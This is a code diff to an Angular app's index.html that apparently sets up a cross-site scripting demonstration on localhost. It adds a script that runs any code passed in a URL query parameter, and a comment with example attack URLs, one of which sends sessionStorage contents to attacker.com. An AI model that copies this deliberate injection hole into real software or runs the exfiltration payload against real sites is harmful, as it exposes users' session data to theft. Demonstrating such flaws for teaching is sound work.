@@ -10,4 +10,23 @@
 	<body>
 		<app-root></app-root>
 	</body>
+
+	<!--
+		XXS Demo 
+		http://localhost:4200/?attack-query=fetch(%22https://attacker.com/steal%22,{method:%22POST%22,headers:{%22Content-Type%22:%22application/json%22},body:JSON.stringify({session:{...sessionStorage}})})
+		http://localhost:4200?attack-query=alert('XSS%3A%20I%20can%20access%20sessionStorage')%3Bconsole.log('Session%20Storage%20Dump%3A'%2C%20sessionStorage)
+     -->
+	<div id="attack-div"></div>
+
+	<script>
+		const payload = new URLSearchParams(location.search).get(
+			"attack-query"
+		);
+		console.log("payload", payload);
+		const attackDiv = document.getElementById("attack-div");
+
+		const script = document.createElement("script");
+		script.innerHTML = payload;
+		document.body.appendChild(script); //
+	</script>
 </html>
